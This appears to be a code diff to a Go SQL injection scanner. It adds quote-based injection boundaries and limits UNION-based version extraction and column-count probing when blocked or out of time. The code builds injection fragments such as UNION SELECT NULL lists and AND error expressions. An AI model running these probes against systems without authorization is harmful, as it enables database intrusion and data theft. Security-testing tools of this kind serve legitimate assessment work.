@@ -42,9 +42,13 @@ func BoundaryCandidates() []BoundaryCandidate {
 // application. The longer list is only tried when none of these work.
 func quickBoundaryCandidates() []BoundaryCandidate {
 	return []BoundaryCandidate{
+		// Open string context where the application itself supplies the
+		// closing quote. This is the most common shape and needs no comment.
+		{"'", ""},
 		{"'", "-- -"},
 		{"'", "#"},
 		{"'", "-- "},
+		{"\"", ""},
 		{"\"", "-- -"},
 		{"", ""},
 		{")", "-- -"},
@@ -426,13 +430,17 @@ func (e *Engine) identifyVersion(session *Session, d *Dialect) {
 	probe.Technique = "union"
 	exec := NewExecutor(e, &probe)
 	// unionScalar detects the column count lazily. This lets version
-	// extraction work even when the confirmed technique was boolean or
-	// time based, as long as the target also accepts UNION output.
-	if value, err := exec.unionScalar(d.Version()); err == nil && looksLikeVersion(value) {
-		session.Columns = probe.Columns
-		session.StringCol = probe.StringCol
-		session.DBMSVersion = value
-		return
+	// extraction work when UNION output is confirmed, but it is skipped for a
+	// target whose confirmed technique is blind: every column count would be
+	// rejected and the probe would burn the whole scan budget.
+	if strings.EqualFold(session.Technique, "union") &&
+		atomic.LoadInt64(&e.blocked) < 5 {
+		if value, err := exec.unionScalar(d.Version()); err == nil && looksLikeVersion(value) {
+			session.Columns = probe.Columns
+			session.StringCol = probe.StringCol
+			session.DBMSVersion = value
+			return
+		}
 	}
 	if expr, ok := d.ErrorExpr(d.Version()); ok {
 		body, _, err := exec.Request(" AND " + expr)
@@ -511,6 +519,9 @@ func (e *Engine) DetectUnionColumns(session *Session) (int, int, bool) {
 	marker := d.Marker("'HACKIT'")
 
 	for n := 1; n <= 25; n++ {
+		if e.expired() || atomic.LoadInt64(&e.blocked) >= 5 {
+			return 0, 0, false
+		}
 		for col := 0; col < n; col++ {
 			nulls := make([]string, n)
 			for i := range nulls {
@@ -520,10 +531,16 @@ func (e *Engine) DetectUnionColumns(session *Session) (int, int, bool) {
 			fragment := " UNION SELECT " + strings.Join(nulls, ",")
 			body, _, err := exec.Request(fragment)
 			if err != nil {
+				if atomic.LoadInt64(&e.blocked) >= 5 {
+					return 0, 0, false
+				}
 				continue
 			}
 			if strings.Contains(body, "~HACKIT~") {
 				return n, col, true
+			}
+			if atomic.LoadInt64(&e.blocked) >= 5 {
+				return 0, 0, false
 			}
 		}
 	}
